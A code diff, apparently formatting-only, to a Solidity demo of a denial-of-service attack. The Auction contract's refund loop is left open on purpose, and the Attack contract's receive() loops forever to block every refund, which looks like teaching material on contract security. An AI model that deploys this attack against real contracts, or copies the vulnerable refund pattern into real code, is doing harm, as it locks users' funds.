@@ -14,11 +14,13 @@ contract Auction {
     }
 
     function refund() external {
-        for(uint i = refundProgress; i < allBidders.length; i++) {
+        for (uint i = refundProgress; i < allBidders.length; i++) {
             console.log(refundProgress);
             address nextBidders = allBidders[i];
             console.log(nextBidders);
-            (bool success,) = nextBidders.call{value: bidders[nextBidders]}("");
+            (bool success, ) = nextBidders.call{value: bidders[nextBidders]}(
+                ""
+            );
             console.log("next refund ...");
             require(success, "failed to refund");
 
@@ -32,7 +34,7 @@ contract Attack {
     bool doHack = true;
     address public owner;
 
-    constructor (address _auction) {
+    constructor(address _auction) {
         owner = msg.sender;
         auction = Auction(_auction);
     }
@@ -48,12 +50,11 @@ contract Attack {
     }
 
     receive() external payable {
-        if(doHack == true) {
-            while(true) {}
+        if (doHack == true) {
+            while (true) {}
         } else {
-            (bool success,) = owner.call{value: msg.value}("");
+            (bool success, ) = owner.call{value: msg.value}("");
             require(success, "failed");
         }
-
     }
 }
